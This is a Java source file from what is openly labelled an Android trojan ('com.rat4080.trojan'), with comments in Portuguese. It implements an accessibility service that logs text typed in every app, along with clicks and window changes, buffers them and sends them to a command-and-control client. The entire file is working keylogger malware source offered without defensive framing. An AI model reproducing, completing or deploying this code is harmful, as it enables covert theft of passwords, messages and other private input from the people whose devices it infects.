package com.rat4080.trojan;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.*;

/**
 * Serviço de acessibilidade — keylogger e leitura de ecrã
 */
public class Accessibility extends AccessibilityService {
    
    private static final String TAG = "Rat4080Accessibility";
    private static final String TARGET_PACKAGE = null; // null = todas as apps
    
    private StringBuilder keylogBuffer;
    private C2Client c2Client;
    
    @Override
    public void onCreate() {
        super.onCreate();
        keylogBuffer = new StringBuilder();
        Log.i(TAG, "Serviço de acessibilidade iniciado");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            // Regista eventos de texto
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                String text = event.getText().toString();
                String packageName = event.getPackageName() != null 
                    ? event.getPackageName().toString() 
                    : "unknown";
                
                if (!text.isEmpty()) {
                    keylogBuffer.append("[").append(packageName).append("] ")
                               .append(text).append("\n");
                    
                    // Envia buffer quando atinge 500 caracteres
                    if (keylogBuffer.length() > 500) {
                        flushKeylog();
                    }
                }
            }
            
            // Regista cliques
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    String viewText = source.getText() != null 
                        ? source.getText().toString() 
                        : "";
                    String viewDescription = source.getContentDescription() != null 
                        ? source.getContentDescription().toString() 
                        : "";
                    
                    if (!viewText.isEmpty() || !viewDescription.isEmpty()) {
                        String clickInfo = "CLIQUE: " + viewText + " " + viewDescription;
                        keylogBuffer.append(clickInfo).append("\n");
                    }
                    
                    source.recycle();
                }
            }
            
            // Regista mudanças de janela
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String packageName = event.getPackageName() != null 
                    ? event.getPackageName().toString() 
                    : "unknown";
                String className = event.getClassName() != null 
                    ? event.getClassName().toString() 
                    : "unknown";
                
                keylogBuffer.append("JANELA: ").append(packageName)
                           .append(" / ").append(className).append("\n");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro no evento de acessibilidade: " + e.getMessage());
        }
    }
    
    private void flushKeylog() {
        if (c2Client != null && keylogBuffer.length() > 0) {
            JSONObject keylogData = new JSONObject();
            try {
                keylogData.put("log", keylogBuffer.toString());
                c2Client.sendData("keylog", keylogData);
            } catch (Exception e) {
                Log.e(TAG, "Erro ao enviar keylog: " + e.getMessage());
            }
            keylogBuffer.setLength(0);
        }
    }
    
    public void setC2Client(C2Client c2Client) {
        this.c2Client = c2Client;
    }
    
    @Override
    public void onInterrupt() {
        Log.i(TAG, "Serviço de acessibilidade interrompido");
    }
    
    @Override
    public void onDestroy() {
        flushKeylog();
        super.onDestroy();
    }
}
